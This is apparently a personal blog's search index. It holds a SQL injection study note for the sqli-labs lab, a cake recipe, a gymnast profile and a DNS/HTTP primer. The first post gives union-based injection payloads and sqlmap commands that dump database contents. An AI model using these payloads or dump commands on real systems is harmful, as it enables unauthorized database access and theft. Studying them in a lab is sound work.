<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>sql注入</title>
    <url>/2024/04/15/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="使用docker搭建靶场"><a href="#使用docker搭建靶场" class="headerlink" title="使用docker搭建靶场"></a>使用docker搭建靶场</h4><ul>
<li>首先虚拟机要换好源</li>
</ul>
<p>docker pull c0ny1&#x2F;sqli-labs</p>
<ul>
<li>查看安装好的docker镜像</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<ul>
<li>映射端口挂载文件。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd -p 系统未占用端口:80 -p 系统未占用端口:3306 镜像id</span><br></pre></td></tr></table></figure>

<ul>
<li><p>查看正在运行的docker</p>
<p>docker ps</p>
</li>
<li><p>查看所有的docker</p>
<p>docker ps -a</p>
</li>
<li><p>进入docker容器</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>进入容器，设置数据库允许外部链接。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="Mysql数据库"><a href="#Mysql数据库" class="headerlink" title="Mysql数据库"></a>Mysql数据库</h4><ul>
<li><p>数据库</p>
</li>
<li><p>表</p>
</li>
<li><p>字段</p>
</li>
<li><p>查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where username =&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>删</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from users where username = &#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>增</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into users (username,password) values (&#x27;admin&#x27;,&#x27;admin&#x27;);</span><br></pre></td></tr></table></figure>

<p>改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set password=&#x27;123456&#x27; where username=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><ul>
<li><p>提示输入数字值的ID作为参数 我们输入?id&#x3D;1。 </p>
</li>
<li><p>通过数字值不同返回的内容也不同所以我们输入的内容是带入到数据库里面查询了。 </p>
</li>
<li><p>判断sql语句是否是拼接且是字符型还是数字型。 </p>
</li>
<li><p>判断是否存在注入</p>
</li>
</ul>
<p>​			and 1&#x3D;1–+ and 1&#x3D;2–+ </p>
<ul>
<li>判断表有多少列</li>
</ul>
<p>​			order by </p>
<ul>
<li>判断回显</li>
</ul>
<p>​			union select 1,2,…</p>
<ul>
<li><p>联合查询库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA--+</span><br></pre></td></tr></table></figure>


</li>
<li><p>联合查询表</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;库名&#x27;--+</span><br></pre></td></tr></table></figure>



<ul>
<li><p>联合查询字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name=&#x27;表名&#x27;--+</span><br></pre></td></tr></table></figure>


</li>
<li><p>联合查询字段值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select group_concat(字段1 ,字段2 ,字段3) from users--+</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>探测目标（常用探测） </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.python sqlmap.py -u 目标url+get参数</span><br><span class="line">2.python sqlmap.py -r 流量包文件</span><br></pre></td></tr></table></figure>

<p>获取数据库名 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u 目标url --dbs</span><br></pre></td></tr></table></figure>

<p>获取表名 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 --tables</span><br></pre></td></tr></table></figure>

<p>获取字段名 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>

<p>获取字段值 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u 目标 -D 库名 -T 表名 --dump #获取全部</span><br><span class="line">sqlmap -u 目标 -D 库名 -T 表名 -C &quot;字段1,字段2,..&quot; --dump #获取指</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>制作美食</title>
    <url>/2024/04/15/%E5%88%B6%E4%BD%9C%E7%BE%8E%E9%A3%9F/</url>
    <content><![CDATA[<h1 id="制作美味的巧克力蛋糕"><a href="#制作美味的巧克力蛋糕" class="headerlink" title="制作美味的巧克力蛋糕"></a>制作美味的巧克力蛋糕</h1><h2 id="材料"><a href="#材料" class="headerlink" title="材料"></a>材料</h2><ul>
<li>1 杯面粉</li>
<li>1 杯砂糖</li>
<li>1&#x2F;2 杯可可粉</li>
<li>1 茶匙泡打粉</li>
<li>1&#x2F;2 茶匙小苏打</li>
<li>1&#x2F;2 茶匙盐</li>
<li>2 个大鸡蛋</li>
<li>1&#x2F;2 杯牛奶</li>
<li>1&#x2F;4 杯沙拉油</li>
<li>2 茶匙香草提取物</li>
<li>1&#x2F;2 杯沸水</li>
<li>巧克力酱（作为装饰）</li>
</ul>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li><p>预热烤箱至 350°F（175°C）。准备一个 9 英寸（23 厘米）的圆形蛋糕模具，涂抹一层薄薄的黄油或喷洒食用油喷剂。</p>
</li>
<li><p>在一个大碗中，将面粉、砂糖、可可粉、泡打粉、小苏打和盐混合均匀。</p>
</li>
<li><p>在另一个碗中，将鸡蛋、牛奶、沙拉油和香草提取物混合搅拌，直至充分融合。</p>
</li>
<li><p>将湿混合物倒入干混合物中，搅拌至无干粉。</p>
</li>
<li><p>慢慢地倒入沸水，持续搅拌，直至蛋糕糊变得顺滑。注意不要过度搅拌。</p>
</li>
<li><p>将蛋糕糊倒入准备好的蛋糕模具中。</p>
</li>
<li><p>把蛋糕放入预热好的烤箱中，烘烤约 30-35 分钟，或者直到用牙签插入蛋糕中心，牙签上没有粘着蛋糕糊就表示烤好了。</p>
</li>
<li><p>把烤好的蛋糕从烤箱中取出，待凉一段时间后，脱模。</p>
</li>
<li><p>把巧克力酱均匀地涂抹在蛋糕表面，根据个人喜好，可以撒上一些巧克力碎或坚果碎。</p>
</li>
<li><p>切片享用！</p>
</li>
</ol>
<h2 id="小贴士"><a href="#小贴士" class="headerlink" title="小贴士"></a>小贴士</h2><ul>
<li>可以根据个人口味在蛋糕糊中添加一些巧克力片或者坚果碎，增添口感和香气。</li>
<li>确保蛋糕完全冷却后再涂抹巧克力酱，这样巧克力酱才不会融化并滑落。</li>
<li>如果想要蛋糕更加松软湿润，可以在蛋糕糊中加入一些酸奶或者酸奶油。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>周二</title>
    <url>/2024/04/16/%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<p><img src="/../assets/12/default_top_img.jpg"></p>
]]></content>
  </entry>
  <entry>
    <title>杨龙</title>
    <url>/2024/04/15/%E6%9D%A8%E9%BE%99/</url>
    <content><![CDATA[<h1 id="杨龙：中国体操界的新星"><a href="#杨龙：中国体操界的新星" class="headerlink" title="杨龙：中国体操界的新星"></a>杨龙：中国体操界的新星</h1><p>杨龙，中国体操运动员，出生于湖北省武汉市。他以其出色的技艺和出色的表现而闻名于世，成为中国体操界的一颗新星。</p>
<h2 id="职业生涯"><a href="#职业生涯" class="headerlink" title="职业生涯"></a>职业生涯</h2><p>杨龙自幼展现出对体操的热爱和天赋。在青少年时期，他就开始接受专业的训练，并展现出了非凡的潜力。随着时间的推移，他在国内外比赛中频频斩获金牌，逐渐成为备受瞩目的新秀。</p>
<p>在国际赛场上，杨龙更是展现出了他的实力和魅力。他的优异表现吸引了全球观众的目光，为中国体操队赢得了荣誉，并为自己赢得了无数粉丝的喜爱。</p>
<h2 id="成就与荣誉"><a href="#成就与荣誉" class="headerlink" title="成就与荣誉"></a>成就与荣誉</h2><p>杨龙在其职业生涯中取得了许多令人瞩目的成就。他多次在世界体操锦标赛和奥运会等国际比赛中斩获奖牌，为中国体操队增添了荣耀。他的稳健表现和出色技艺为他赢得了许多称赞和尊重，成为了中国体操界的一面旗帜。</p>
<h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>杨龙的未来充满了无限的可能性。作为中国体操队的核心成员之一，他将继续努力训练，追求更高的成就。相信在他的努力下，他将为中国体操队带来更多荣誉，成为中国体操界的传奇人物之一。</p>
<p>杨龙以其出色的技艺和令人钦佩的精神赢得了广泛的认可和喜爱。他不仅是中国体操队的骄傲，也是全国体育界的典范，他的未来必定光芒万丈。</p>
]]></content>
  </entry>
  <entry>
    <title>网络是如何运作的</title>
    <url>/2024/04/17/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="什么是dns"><a href="#什么是dns" class="headerlink" title="什么是dns"></a>什么是dns</h2><p>DNS（域名系统）为我们提供了一种与互联网上的设备进行通信的简单方法，而无需记住复杂的数字。就像每栋房子都有一个唯一的地址来直接向其发送邮件一样，互联网上的每台计算机都有自己唯一的地址来与其通信，称为 IP 地址。IP 地址如下所示104.26.10.229 ，由句点分隔的 4 组数字，范围从 0 - 255。当您想要访问某个网站时，记住这组复杂的数字并不方便，而这正是DNS可以提供帮助的地方。因此，您可以记住 tryhackme.com，而不是记住 104.26.10.229。</p>
<h2 id="域层次结构"><a href="#域层次结构" class="headerlink" title="域层次结构"></a>域层次结构</h2><p><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700233480551-2a66cc83-e0dd-4f8b-b2a7-afc130796883.png" alt="img"></p>
<h3 id="TLD（顶级域名）"><a href="#TLD（顶级域名）" class="headerlink" title="TLD（顶级域名）"></a>TLD（顶级域名）</h3><p>TLD 是域名最右侧的部分。例如，tryhackme.com TLD 是**.com<strong>。TLD 有两种类型：gTLD（通用顶级域）和 ccTLD（国家&#x2F;地区代码顶级域）。从历史上看，gTLD 的目的是告诉用户域名的用途；例如，.com 用于商业目的，.org 用于组织，.edu 用于教育目的，.gov 用于政府目的。ccTLD 用于地理目的，例如，.ca 用于位于加拿大的网站，.co.uk 用于位于英国的网站等。由于这种需求，新 gTLD 大量涌入，包括 .online 、 .club 、 .website 、 .biz 等等。如需 2000 多个 TLD 的完整列表，<a href="https://data.iana.org/TLD/tlds-alpha-by-domain.txt">请点击此处</a>。</strong></p>
<h3 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h3><p>以tryhackme.com为例，.com部分是TLD，tryhackme是二级域名。注册域名时，二级域名限制为63个字符+TLD，并且只能使用az 0-9和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。**</p>
<h3 id="子域"><a href="#子域" class="headerlink" title="子域"></a>子域</h3><p>子域名位于二级域名的左侧，使用句点分隔；例如，在名称 admin.tryhackme.com 中，管理部分是子域。子域名的创建限制与二级域名相同，长度限制为 63 个字符，且只能使用 az 0-9 和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。您可以使用用句点分割的多个子域来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符或更少。您可以为域名创建的子域数量没有限制。</p>
<h3 id="发出请求"><a href="#发出请求" class="headerlink" title="发出请求"></a>发出请求</h3><h4 id="当您发出DNS请求时会发生什么"><a href="#当您发出DNS请求时会发生什么" class="headerlink" title="当您发出DNS请求时会发生什么"></a>当您发出DNS请求时会发生什么</h4><ol>
<li>当您请求域名时，您的计算机首先检查其本地缓存，看看您最近是否查找过该地址；如果没有，则会向您的递归DNS服务器发出请求。</li>
<li>递归DNS服务器通常由您的 ISP 提供，但您也可以选择自己的。该服务器还具有最近查找的域名的本地缓存。如果在本地找到结果，则会将其发送回您的计算机，您的请求将在此处结束（这对于 Google、Facebook、Twitter 等流行且请求频繁的服务来说很常见）。如果在本地无法找到请求，则会开始寻找正确答案的旅程，从互联网的根 DNS 服务器开始。</li>
<li>根服务器充当互联网的DNS主干网；他们的工作是根据您的请求将您重定向到正确的顶级域名服务器。例如，如果您请求<a href="http://www.tryhackme.com/">www.tryhackme.com</a>，根服务器将识别 .com 的顶级域名，并将您转至处理 .com 地址的正确 TLD 服务器。</li>
<li>TLD 服务器保存着在哪里可以找到权威服务器来应答DNS请求的记录。权威服务器通常也称为域的名称服务器。例如，<a href="http://tryhackme.com/">tryhackme.com</a>的名称服务器是<a href="http://kip.ns.cloudflare.com/">kip.ns.cloudflare.com</a>和<a href="http://uma.ns.cloudflare.com/">uma.ns.cloudflare.com</a>。您经常会发现一个域名有多个域名服务器，可以作为备份，以防万一其中一个域名服务器出现故障。</li>
<li>权威DNS服务器是负责存储特定域名的 DNS 记录以及对域名 DNS 记录进行任何更新的服务器。根据记录类型，DNS 记录会被发送回递归 DNS 服务器，其中本地副本将被缓存以供将来的请求使用，然后中继回发出请求的原始客户端。DNS 记录都带有 TTL（生存时间）值。该值是一个以秒为单位的数字，响应应保存在本地，直到您必须再次查找为止。缓存可以节省每次与服务器通信时发出 DNS 请求的麻烦。</li>
</ol>
<h1 id="http详细信息"><a href="#http详细信息" class="headerlink" title="http详细信息"></a>http详细信息</h1><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="什么是-HTTP？（超文本传输协议）"><a href="#什么是-HTTP？（超文本传输协议）" class="headerlink" title="什么是 HTTP？（超文本传输协议）"></a>什么是 HTTP？（超文本传输协议）</h3><p>HTTP 是您每次查看网站时都会使用的协议，由 Tim Berners-Lee 和他的团队在 1989 年至 1991 年间开发。HTTP 是一组用于与 Web 服务器通信以传输网页数据（无论是 HTML、图像、视频等）的规则。</p>
<h3 id="什么是-HTTPS？（超文本传输协议安全）"><a href="#什么是-HTTPS？（超文本传输协议安全）" class="headerlink" title="什么是 HTTPS？（超文本传输协议安全）"></a>什么是 HTTPS？（超文本传输协议安全）</h3><p>HTTPS 是 HTTP 的安全版本。HTTPS 数据经过加密，因此它不仅可以阻止人们看到您正在接收和发送的数据，还可以确保您正在与正确的 Web 服务器通信，而不是与冒充它的东西通信。</p>
<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>当我们访问网站时，您的浏览器需要向 Web 服务器发出请求，以获取 HTML、图像等资源，并下载响应。在此之前，您需要具体告诉浏览器如何以及在哪里访问这些资源，这就是 URL 的用武之地。</p>
<h3 id="什么是网址？（统一资源定位符）"><a href="#什么是网址？（统一资源定位符）" class="headerlink" title="什么是网址？（统一资源定位符）"></a>什么是网址？（统一资源定位符）</h3><p>如果您使用过互联网，那么您之前就使用过 URL。URL 主要是关于如何访问互联网上的资源的指令。下图显示了 URL 的所有功能（它并未在每个请求中使用所有功能）。</p>
<p><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700232111596-14038438-50c7-4d90-ace5-48dde3473130.png" alt="img"></p>
<p><strong>方案：</strong>指示使用什么协议来访问资源，例如 HTTP、HTTPS、FTP（文件传输协议）。</p>
<p><strong>用户：</strong>有些服务需要身份验证才能登录，您可以将用户名和密码放入 URL 中进行登录。</p>
<p><strong>主机：</strong>您要访问的服务器的域名或IP地址。</p>
<p><strong>端口：</strong>您要连接的端口，通常 HTTP 为 80，HTTPS 为 443，但这可以托管在 1 - 65535 之间的任何端口上。</p>
<p><strong>路径：</strong>您尝试访问的资源的文件名或位置。</p>
<p><strong>查询字符串：</strong>可以发送到请求路径的额外信息位。例如，&#x2F;博客？<strong>id&#x3D;1</strong>会告诉博客路径您希望接收 id 为 1 的博客文章。</p>
<p><strong>片段：</strong>这是对所请求的实际页面上的位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到该页面，因此用户一旦访问该页面就可以查看。</p>
<h3 id="发出请求-1"><a href="#发出请求-1" class="headerlink" title="发出请求"></a>发出请求</h3><p>只需一行“ <strong>GET &#x2F; HTTP&#x2F;1.1</strong> ”即可向 Web 服务器发出请求</p>
<p><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700232111064-b8f04d05-ed2c-4823-9e28-82a342b0f811.png" alt="img"></p>
<p>但为了获得更丰富的网络体验，您还需要发送其他数据。其他数据在所谓的标头中发送，其中标头包含提供给您正在通信的 Web 服务器的额外信息，但我们将在标头任务中详细介绍这一点。</p>
<h4 id="请求示例："><a href="#请求示例：" class="headerlink" title="请求示例："></a>请求示例：</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>tryhackme.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 Firefox/87.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://tryhackme.com/</span><br></pre></td></tr></table></figure>

<p>要细分此请求的每一行：</p>
<p><strong>第 1 行：</strong>此请求发送 GET 方法（更多信息请参阅 HTTP 方法任务），使用 &#x2F; 请求主页并告诉 Web 服务器我们正在使用 HTTP 协议版本 1.1。</p>
<p><strong>第 2 行：</strong>我们告诉 Web 服务器我们想要访问 tryhackme.com 网站</p>
<p><strong>第 3 行：</strong>我们告诉 Web 服务器我们正在使用 Firefox 版本 87 浏览器</p>
<p><strong>第 4 行：</strong>我们告诉 Web 服务器将我们引向此页面的网页是<a href="https://tryhackme.com/">https://tryhackme.com</a></p>
<p><strong>第 5 行：</strong> HTTP 请求始终以空行结尾，以通知 Web 服务器请求已完成。</p>
<h4 id="响应示例："><a href="#响应示例：" class="headerlink" title="响应示例："></a>响应示例：</h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.15.8</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 09 Apr 2021 13:34:03 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>98</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>TryHackMe<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    Welcome To TryHackMe.com</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>要细分响应的每一行：</p>
<p><strong>第 1 行：</strong> HTTP 1.1 是服务器正在使用的 HTTP 协议的版本，后面是 HTTP 状态代码（在本例中为“200 Ok”），它告诉我们请求已成功完成。</p>
<p><strong>第 2 行：</strong>这告诉我们 Web 服务器软件和版本号。</p>
<p><strong>第 3 行：</strong> Web 服务器的当前日期、时间和时区。</p>
<p><strong>第 4 行：</strong> Content-Type 标头告诉客户端将要发送哪种信息，例如 HTML、图像、视频、pdf、XML。</p>
<p><strong>第 5 行：</strong> Content-Length 告诉客户端响应的长度，这样我们就可以确认没有数据丢失。</p>
<p><strong>第 6 行：</strong> HTTP 响应包含一个空行，以确认 HTTP 响应的结束。</p>
<p><strong>第 7-14 行：</strong>已请求的信息，在本例中为主页。</p>
<h3 id="http方法"><a href="#http方法" class="headerlink" title="http方法"></a>http方法</h3><p>HTTP 方法是客户端在发出 HTTP 请求时显示其预期操作的一种方式。HTTP 方法有很多，但我们将介绍最常见的方法，尽管大多数情况下您将处理 GET 和 POST 方法。</p>
<h3 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h3><p><strong>HTTP 状态代码：</strong></p>
<p>在上一个任务中，您了解到，当 HTTP 服务器响应时，第一行始终包含一个状态代码，通知客户端其请求的结果以及可能如何处理它。这些状态代码可以分为 5 个不同的范围：</p>
<table>
<thead>
<tr>
<th><strong>100-199 - 信息响应</strong></th>
<th>发送这些信息是为了告诉客户端他们的请求的第一部分已被接受，他们应该继续发送请求的其余部分。这些代码不再常见。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>200-299 - 成功</strong></td>
<td>此范围的状态代码用于告诉客户端他们的请求已成功。</td>
</tr>
<tr>
<td><strong>300-399 - 重定向</strong></td>
<td>它们用于将客户端的请求重定向到另一个资源。这可以是不同的网页或完全不同的网站。</td>
</tr>
<tr>
<td><strong>400-499 - 客户端错误</strong></td>
<td>用于通知客户端他们的请求有错误。</td>
</tr>
<tr>
<td><strong>500-599 - 服务器错误</strong></td>
<td>这是为服务器端发生的错误保留的，通常表明服务器处理请求时存在相当大的问题。</td>
</tr>
</tbody></table>
<p><strong>常见的 HTTP 状态代码：</strong></p>
<p>有很多不同的 HTTP 状态代码，这还不包括应用程序甚至可以定义自己的状态代码，我们将介绍您可能遇到的最常见的 HTTP 响应：</p>
<table>
<thead>
<tr>
<th><strong>200 - 好的</strong></th>
<th>请求已成功完成。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>201 - 创建</strong></td>
<td>资源已创建（例如新用户或新博客文章）。</td>
</tr>
<tr>
<td><strong>301 - 永久移动</strong></td>
<td>这会将客户端的浏览器重定向到新网页或告诉搜索引擎该页面已移动到其他位置并改为在那里查找。</td>
</tr>
<tr>
<td><strong>302 - 找到</strong></td>
<td>与上面的永久重定向类似，但顾名思义，这只是暂时的更改，并且在不久的将来可能会再次更改。</td>
</tr>
<tr>
<td><strong>400 - 错误请求</strong></td>
<td>这告诉浏览器他们的请求中有问题或丢失。如果正在请求的 Web 服务器资源需要客户端未发送的某个参数，有时可以使用此方法。</td>
</tr>
<tr>
<td><strong>401 - 未授权</strong></td>
<td>目前，在您通过 Web 应用程序（最常见的是使用用户名和密码）进行授权之前，您无法查看此资源。</td>
</tr>
<tr>
<td><strong>403 - 禁忌</strong></td>
<td>无论您是否登录，您都无权查看此资源。</td>
</tr>
<tr>
<td><strong>405 - 方法不允许</strong></td>
<td>该资源不允许此方法请求，例如，当资源 &#x2F;create-account 需要 POST 请求时，您向该资源发送 GET 请求。</td>
</tr>
<tr>
<td><strong>404页面不存在</strong></td>
<td>您请求的页面&#x2F;资源不存在。</td>
</tr>
<tr>
<td><strong>500 - 内部服务错误</strong></td>
<td>服务器在您的请求中遇到某种错误，它不知道如何正确处理。</td>
</tr>
<tr>
<td><strong>503服务不可用</strong></td>
<td>该服务器无法处理您的请求，因为它已超载或因维护而停机。</td>
</tr>
</tbody></table>
<p>单击右侧的“查看站点”按钮，查看其中一些 HTTP 状态消息在浏览器中的外观。</p>
<h3 id="headers（标头）"><a href="#headers（标头）" class="headerlink" title="headers（标头）"></a>headers（标头）</h3><p>标头是您在发出请求时可以发送到 Web 服务器的附加数据位。</p>
<p>尽管发出 HTTP 请求时没有严格要求标头，但您会发现很难正确查看网站。</p>
<p><strong>通用请求标头</strong></p>
<p>这些是从客户端（通常是您的浏览器）发送到服务器的标头。</p>
<p><strong>主机：</strong>某些网络服务器托管多个网站，因此通过提供主机标头，您可以告诉它您需要哪个网站，否则您将只收到服务器的默认网站。</p>
<p><strong>用户代理：</strong>这是您的浏览器软件和版本号，告诉网络服务器您的浏览器软件可以帮助其为您的浏览器正确设置网站格式，并且 HTML、JavaScript 和 CSS 的某些元素仅在某些浏览器中可用。</p>
<p><strong>内容长度：</strong>当向 Web 服务器发送数据（例如以表单形式）时，内容长度告诉 Web 服务器在 Web 请求中期望有多少数据。这样服务器就可以确保它不会丢失任何数据。</p>
<p><strong>Accept-Encoding：</strong>告诉 Web 服务器浏览器支持哪些类型的压缩方法，以便可以缩小数据以便通过互联网传输。</p>
<p><strong>Cookie：</strong>发送到服务器的数据，以帮助记住您的信息（有关更多信息，请参阅 cookies 任务）。</p>
<p><strong>通用响应标头</strong></p>
<p>这些是请求后从服务器返回到客户端的标头。</p>
<p><strong>Set-Cookie：</strong>要存储的信息，每次请求时都会发送回 Web 服务器（有关更多信息，请参阅 cookies 任务）。</p>
<p><strong>Cache-Control：</strong>在再次请求之前，将响应内容存储在浏览器缓存中的时间长度。</p>
<p><strong>Content-Type：</strong>这告诉客户端返回的数据类型，即 HTML、CSS、JavaScript、图像、PDF、视频等。使用内容类型标头，浏览器就知道如何处理数据。</p>
<p><strong>内容编码：</strong>通过互联网发送数据时使用什么方法来压缩数据以使其更小。</p>
<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>您以前可能听说过 cookie，它们只是存储在您计算机上的一小段数据。当您从网络服务器收到“Set-Cookie”标头时，Cookie 就会被保存。然后，您发出的每个进一步请求，都会将 cookie 数据发送回 Web 服务器。由于 HTTP 是无状态的（不会跟踪您以前的请求），因此可以使用 cookie 来提醒 Web 服务器您是谁、网站的一些个人设置或者您以前是否访问过该网站。让我们看一下 HTTP 请求的示例：</p>
<p>Cookie 可用于多种目的，但最常用于网站身份验证。cookie 值通常不是可以看到密码的明文字符串，而是一个令牌（人类不易猜出的唯一秘密代码）。</p>
<h1 id="网站如何运作"><a href="#网站如何运作" class="headerlink" title="网站如何运作"></a>网站如何运作</h1><p>在这个房间结束时，您将了解网站是如何创建的，并将介绍一些基本的安全问题。<br>当您访问网站时，您的浏览器（如 Safari 或 Google Chrome）会向网络服务器发出请求，询问有关您正在访问的页面的信息。它将响应您的浏览器用于向您显示页面的数据；Web 服务器只是世界上其他地方处理您的请求的专用计算机</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220165853356-423857609.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365479-03e366d9-66ae-4800-a4e3-59723557d83f.png" alt="img"></a></p>
<p>网站有两个主要组成部分：</p>
<ol>
<li>前端（客户端Client-Side）- 浏览器呈现网站的方式</li>
<li>后端（服务器端Server-Side）- 处理您的请求并返回响应的服务器</li>
</ol>
<p>浏览器向 Web 服务器发出请求还涉及许多其他进程，但现在，您只需要了解您向服务器发出请求，它会响应您的浏览器用于向您呈现信息的数据</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220170040685-1542035642.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365462-f46a0da8-6b21-4492-8445-818966b052b9.png" alt="img"></a></p>
<h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>网站主要使用以下方式创建：</p>
<ul>
<li>HTML用于构建网站并定义其结构</li>
<li>CSS，通过添加样式选项使网站看起来漂亮</li>
<li>JavaScript，使用交互性在页面上实现复杂功能</li>
</ul>
<p>超文本标记语言(HTML) 是编写网站的语言。元素（也称为标签）是 HTML 页面的构建块，它告诉浏览器如何显示内容。下面的代码片段显示了一个简单的 HTML 文档，每个网站的结构都是相同的：<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220170140600-1568687637.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365458-52c2e8c1-9ea0-4066-ac41-00f2876738e2.png" alt="img"></a></p>
<p>HTML 结构（如屏幕截图所示）具有以下组件：</p>
<ul>
<li>定义页面是 HTML5 文档。这有助于跨不同浏览器的标准化，并告诉浏览器使用 HTML5 来解释页面。**<!DOCTYPE html>**</li>
<li>该元素是 HTML 页面的根元素 - 所有其他元素都在该元素之后。**<html>**</li>
<li>该元素包含有关页面的信息（例如页面标题）**<head>**</li>
<li>该元素定义了 HTML 文档的主体；浏览器中仅显示主体内部的内容。**<body>**</li>
<li>该元素定义了一个大标题**<h1>**</li>
<li>该元素定义一个段落**<p>**</li>
<li>还有许多用于不同目的的其他元素（标签）。例如，有用于按钮 ( )、图像 ( )、列表等的标签。 <strong><button><img></strong></li>
</ul>
<p>标签可以包含属性，例如可用于设置元素样式的 class 属性（例如，使标签具有不同的颜色），或 用于图像以指定图像位置的src属性：一个元素可以具有多个属性每个都有自己独特的用途，例如 <strong><p attribute1="value1" attribute2="value2"> 。<p class="bold-text"><img src="img/cat.jpg"></strong>.</p>
<p>元素也可以有一个 id 属性 ( )，它对元素是唯一的。与 class 属性不同，其中多个元素可以使用相同的类，一个元素必须具有不同的 id 才能 唯一地标识它们。元素 id 用于设置样式并通过 JavaScript 对其进行识别。**<p id="example">**</p>
